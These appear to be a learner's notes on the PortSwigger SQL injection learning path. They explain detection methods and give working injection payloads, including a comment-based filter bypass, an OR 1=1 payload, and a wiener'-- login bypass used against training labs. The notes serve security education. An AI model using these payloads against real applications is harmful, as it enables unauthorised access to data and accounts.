# Server Side Vulnerabilities : LEARNING PATH BY PORTSWIGGER

**Made By:** Haider Ali

---


## SQL injection:
A web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. 

can also enable attackers to perform denial-of-service attacks

### How to detect them ?
set of tests against every entry point in the application. To do this, you would typically submit:

-> The single quote character ' and look for errors or other anomalies.

-> Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.

-> Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.

-> Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.

-> OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions

#### Retrieving hidden data

a shopping application that displays products in different categories uses 
https://insecure-website.com/products?category=Gifts 
to get the gifts

this initiates a query to 

SELECT * FROM products
WHERE category = 'Gifts'
AND released = 1

intuitively if we set released to 0 we will get to see all the items not released aswell.

an attacker can
https://insecure-website.com/products?category=Gifts'--
this will edit the query to 

SELECT * FROM products
WHERE category = 'Gifts'--'
AND released = 1

**--** is used to comment out lines in sql so "AND released=1" gets commented out , so now the query that runs is 

SELECT * FROM products
WHERE category = 'Gifts'

we can also edit the url to 
https://insecure-website.com/products?category=Gifts'+OR+1=1--
so we can get to see all categories since 1+1 would always be true so all items will be returned

solved the lab by editing the url 
**https://0ade00fa035e9ae68065d524008a00ac.web-security-academy.net/filter?category=Corporate+gifts**
to
**https://0ade00fa035e9ae68065d524008a00ac.web-security-academy.net/filter?category=Corporate+gifts%20%27+OR+1=1--**

solved the next lab by subverting application logic
, the traditional login form takes input for usernam and password then it runs this query

SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

so if we simply enter wiener'-- this would comment the password part out so any entry in that field will be accepted since it essentially doesnt matter to sql
